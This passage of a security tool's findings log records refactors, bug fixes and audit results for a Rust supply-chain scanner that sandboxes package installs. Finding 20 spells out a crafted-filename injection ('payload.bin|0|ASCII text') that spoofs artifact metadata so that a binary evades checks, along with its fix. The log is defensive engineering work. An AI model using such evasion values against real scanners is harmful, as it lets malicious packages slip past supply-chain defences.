- **`run()` is a god function.** Fair. ~480 lines; the per-manager branches (uv lock / poetry / uv pip sync / uv sync / pip / npm) were near-identical (parse → `scan_many_with_cache` → exit-or-forward) and have now been collapsed into a `bulk_scan!` macro with `ForwardMode` dispatch and `scan_targets`/`exit_with` helpers. `run()` went from ~300 lines of branch logic to ~200. Independently corroborated by the knowledge-graph build (2026-06-11): `run()` has the highest betweenness centrality in the codebase (0.272), bridging five communities; its home cluster and the parsing cluster are the two least-cohesive. ✅ Completed — refactor applied, **byte-identical stdout** (each branch passes its own `$empty_msg`/`$testing_msg`/`$clear_noun` into the macro, so control flow, security semantics, and console output are all unchanged; verified against `HEAD` and by the full test suite). See **Round 3 fixes** below.
- **Async entrypoint + blocking work.** Confirmed via the graph (2026-06-11). The async call chain is `run()` → `scan_packages_versions()` (async) → `trace_sandbox_install_matrix()` → `SandboxRunner` → `trace_install_docker_matrix_with_runtime()`. At the leaf, the `SandboxRunner::trace_install` trait method is **synchronous** (`fn`, not `async fn`) and shells out to Docker via blocking `std::process::Command`, and `spawn_blocking` appears nowhere in `src/`. So the tokio runtime does call straight into blocking Docker I/O on its worker thread. Real, but practical impact is near zero for a run-once-and-exit CLI that does one scan batch. ⚠️ Open — wrap the Docker shell-outs in `spawn_blocking` if the tool ever scans concurrently.
- **No structured logging.** Uses `println!`; `tracing` would suit an audit-trail security tool. Already tracked under ROADMAP "structured logging mode for CI". ⚠️ Open.

### Round 3 fixes — 2026-06-11

The two actionable items from the Round 3 assessment that were code (not roadmap) were applied, plus Finding 13 closed. All 165 tests pass; `cargo clippy --all-targets` and `cargo fmt --check` clean.

- **`run()` de-duplication (`bulk_scan!`).** Extracted `enum ForwardMode { Original, Pinned }`, a `scan_targets` wrapper, and an `exit_with(msg) -> !` helper, and folded the four explicit-list manager branches (`uv pip sync`, `pip`/`pip3`, `npm`) into a `bulk_scan!` macro. **Important correctness note:** an intermediate version of this refactor changed several diagnostic log strings (e.g. `'pip' detected.` instead of `'pip install' detected.`, `for install package set` instead of `for npm package set`, and dropped `from sync sources`). That was caught on review and corrected — the macro now takes the empty-case message, a count-closure for the "testing" line, and the clear-report noun per branch, so stdout is byte-for-byte identical to the pre-refactor output. The lockfile-driven branches (`uv lock`, bare `uv sync`, `poetry`) were intentionally left as explicit blocks because their messages and `Original`-only forwarding do not fit the macro's shape cleanly.
- **Finding 13 — `EnvVarGuard` (RAII, lock-holding).** See Finding 13 above. The naive fix (split lock into set/remove scopes) was rejected because it released `env_lock` during the scan `.await` that reads the env var, reintroducing the cross-test race the lock exists to prevent. The applied fix holds the lock for the whole test via the guard and recovers from poisoning, satisfying both the panic-safety the finding asked for and the serialization the original design required.

### Round 4 fixes — 2026-06-12

All 188 unit tests + integration tests pass; `cargo clippy --all-targets` clean.

- **Finding 15 — Empty `GYRSEEK_*_SCANNER_IMAGE` env var.** See Finding 15 above. `scanner_image_config` used `std::env::var(image_var).unwrap_or_else(|_| default_image)`, so an env var set to `""` (empty string) was treated as a valid image reference. Docker CLI parses an empty name as "invalid reference format" and fails. Fix: filter out empty strings via `.ok().filter(|v| !v.is_empty())` before falling back.

### Round 5 — 2026-06-16 — DNS interceptor + `-xx` strace

All 234 unit/integration tests pass; `just test-uv` and `just test-pip` pass end-to-end; `cargo clippy --all-targets` and `cargo fmt --check` clean.

- **Finding 16 — `extract_dns_map` regex missing `\s*`.** The regex `",\d+,\d+,\{"` expected no whitespace after commas. Real strace output has `", 1024, 0, {"` (spaces after commas). Zero maps extracted in production. Fixed: `",\s*\d+,\s*\d+,\s*\{"`. See Finding 16 above.
- **Finding 17 — `-xx` breaks process-exec harness filtering.** The `-xx` flag hex-escapes all strace output including execve argv. `is_harness_command` matched literal names (`uv`, `npm`, `python`, `env`) which don't appear in `\x2f\x75...` form. Every scan produced Shai-Hulud false positives. Fixed: unescape argv via `unescape_strace_string` before signature construction and harness filtering. See Finding 17 above.
- **Finding 18 — `parse_dns_response` RDLEN offset off by 2 bytes.** Read last 2 bytes of TTL field (offset+6/+7) instead of RDLENGTH (offset+8/+9). Multi-answer DNS responses always corrupted. Fixed: correct offsets and advance. See Finding 18 above.
- Three DNS interceptor edge-case tests added (domain not in baseline, forward resolver fails, end-to-end with realistic strace trace).
- **Finding 19 — `decode_dns_name` circular pointer infinite loop.** No cycle detection in compression pointer traversal. A self-referencing `\xc0\x00` at offset 0 causes an infinite `loop {}`. Fixed: `pointer_count` limit of 5 hops. See Finding 19 above.
- `docs/TESTS.md` updated to 50 tests documented.
- `AGENTS.md` and `README.md` updated with DNS interceptor/`-xx`/exec-unescape details.

### Round 6 — 2026-06-16 — Self-referencing baseline override fix

**Finding 10 — Critical.** `select_effective_baselines` inserted override versions without checking equality to `current`. A self-referencing override (`baseline-1: "1.3.0"` while installing `1.3.0`) caused probe deduplication → empty diffs → no anomalies ever fire.

**Fix:** Added `v != *current` guard to both override insertion paths. Warning emitted at the call site when a configured override equals the scanned version. Four new edge-case tests:
- `override_m2_equal_to_current_is_excluded_from_baselines`
- `both_overrides_equal_to_current_skipped_and_filled_from_fetched`
- `override_equal_to_current_with_no_fetched_baselines_returns_empty`
- `override_equal_to_current_with_baseline_count_one_is_skipped`
- `only_m2_is_set_and_equals_current_is_excluded`
- `baseline_count_zero_with_override_equal_to_current_returns_empty`
- `both_override_slots_none_falls_through_to_fetched_baselines`

All 259 tests pass (244 lib + 15 integration); clippy and fmt clean. See Finding 10 above for full details.

---

### Round 7 — 2026-06-16 — External audit

External static review of `sandbox.rs` and `scanning.rs` for remaining sandbox-escaping, bypass, and performance gaps. Produced findings #20–24.

- **Finding 20 (Critical)** — Pipe-delimiter injection in artifact scanner. File path not escaped; crafted filename can override `size` and `type` fields, bypassing all artifact checks. **✅ Fixed in Round 8.**
- **Finding 21 (High)** — Hardcoded 512 MB container memory limit. npm/pnpm native builds (node-gyp, esbuild) routinely OOM-killed.
- **Finding 22 (Medium)** — Missing IPv6 ULA filter. `fc00::/7` not recognised as local address; internal container traffic flagged as exfiltration.
- **Finding 23 (Medium)** — Host mode selected silently. No stderr warning when `GYRSEEK_SANDBOX=host` disables all container isolation.
- **Finding 24 (Medium)** — Artifact scan O(N) subprocess overhead. 3 forks per file → 30k–40k processes on a 10k-file node_modules. Minutes of latency or timeout.

### Round 8 — 2026-06-16 — Architectural & coverage audit + Finding 20 fix

Review of `lib.rs`, `README.md`, and the forwarding pipeline for deferred-execution coverage gaps, supply-chain hardening, and code quality. Produced findings #25–27 and C16. **Finding 20 fixed** — shell script switched to null-byte delimiters (`printf '%s\0...'`) so pipe characters in file paths cannot hijack the parser.

- **Finding 25 (High)** — Import-time execution (Telnyx T26) not captured. Module-scope code in installed `.py` files fires after sandbox exits. Mitigation: post-install `python -c "import <pkg>"` trigger.
- **Finding 26 (Medium)** — `Command::new(&self.manager)` uses PATH lookup; `.` or writable dirs in PATH allow relative-path hijacking. Mitigation: resolve to absolute path and validate prefix.
- **Finding 27 (Low)** — `--config`/`-c` value not validated. A flag-like argument (e.g. `--version`) is swallowed as the config path, producing confusing error or no-op.
- **C16 (Complexity)** — `bulk_scan!` macro shared across uv/pip/npm/pnpm; a parsing regression in one ecosystem affects all. Mitigation: per-ecosystem typed functions.

---

### Finding 20 — Critical | `sandbox.rs:559` / `scanning.rs:730` | ✅ Fixed

**Summary:** The artifact scan log uses `|` as a field delimiter, but the file path (`$f`) is not escaped for pipes or newlines. A crafted filename can inject fake fields into the parsed record, bypassing all artifact security checks (large_file, unexpected_runtime, suspicious_pth, binary).

**Root cause:** The shell loop (`sandbox.rs:555–559`) writes each file as:
```
echo "$f|$size|$type|$content" >> {}
```
Only `$content` has pipes replaced (`tr '|' ' '`). The file path `$f` is raw. The Rust parser (`scanning.rs:730`) splits on `|`:
```rust
let parts: Vec<&str> = line.splitn(4, '|').collect();
```
A file named `payload.bin|0|ASCII text` produces `parts = ["payload.bin", "0", "ASCII text", "…"]` — the injected `0` becomes the parsed `size`, and `ASCII text` overrides the real `file -b` type. A large ELF binary hides as a small text file.

**Failure scenario:** Attacker publishes a package containing `/bin/payload.bin|0|ASCII text` (30 MB ELF). The classifier sees `size=0` (no `large_file` hit), `file_type="ASCII text"` (no `binary`/`unexpected_runtime` hit). The artifact is not flagged. Post-install scan reports clean.

**Fix direction:** Choose a delimiter that cannot appear in POSIX file paths (e.g. `\x00` via `printf`), or escape `|` and newlines in `$f` before writing the log line. The Rust parser must match whatever escaping scheme is chosen.

**✅ Fix status — FIXED.** The shell script now uses `printf '%s\0%s\0%s\0%s\n'` with null-byte (`\0`) field delimiters instead of `|`. Null bytes cannot appear in POSIX file paths, so delimiter injection is impossible. The Rust parser (`classify_inventory_lines`) splits on `'\x00'` instead of `'|'`. Pipe characters in content are still replaced with spaces (`tr '|' ' '`) as defence-in-depth. (`sandbox.rs:554–559`, `scanning.rs:730`; test `classify_inventory_pipe_in_filename_not_injected` verifies a filename containing `|0|ASCII text` is parsed as a single path with correct size and file type fields.)

---


### Finding 73 — Low | `docs/common_prompts.md` | ✅ Fixed

**Summary:** Missing trailing newline.

**Root cause:** The file was saved without a POSIX-compliant trailing newline.

**Failure scenario:** Creates formatting issues with tools like `cat` or `git diff`.

**Fix direction:** Add a trailing newline.

---

---

### Finding 71 — Low | `docs/FIXED_FINDINGS.md` | ✅ Fixed

**Summary:** Drops cross-finding chain documentation.

**Root cause:** When `FINDINGS.md` was split, the architectural context explaining how chained bugs create compounded attack surfaces was lost.

**Failure scenario:** Loss of critical threat modeling context regarding how independent vulnerabilities were combined to create bypasses.

**Fix direction:** Restore the cross-finding chain narratives to `FIXED_FINDINGS.md`.